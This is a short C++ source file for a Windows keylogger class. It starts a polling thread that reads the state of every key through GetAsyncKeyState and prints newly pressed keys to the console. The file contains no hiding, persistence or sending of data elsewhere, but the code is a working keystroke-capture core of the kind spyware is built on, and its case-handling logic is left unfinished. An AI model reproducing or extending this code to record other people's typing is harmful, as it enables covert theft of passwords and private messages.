#include "keylogger.h"

#include <iostream>

Keylogger::Keylogger(milliseconds polling) 
	: Keyboard(polling)
	, keylog(nullptr) {}	

void Keylogger::startKeylog() {
	auto listener = [this]() {
		while (isKeylogging()) {
			setKeysState();
			handleOutput();
			std::this_thread::sleep_for(polling);
		}
	};
	keylog = new std::thread(listener);
}
void Keylogger::stopKeylog() {
	std::thread* temp = keylog;
	keylog = nullptr;
	temp->join();
	delete temp;
}
bool Keylogger::isKeylogging() {
	return keylog != nullptr;
}

void Keylogger::setKeysState() {
	for (BYTE i = 0; i < KEYBOARDSIZE; i++) {
		setKeyState(i, GetAsyncKeyState(i));
	}
}
void Keylogger::handleOutput() {
	const std::vector<Key>& keys = getKeys();

	bool caps = keys[VK_CAPITAL].isToggled();
	bool shift = keys[VK_SHIFT].isPressed();

	bool upper = caps != shift;

	for (BYTE i = 0; i < KEYBOARDSIZE; i++) {
		const Key& key = keys[i];
		if (key.isTriggered() && key.isPressed()) {
			std::wcout << (wchar_t)key.value;
		}
	}
}

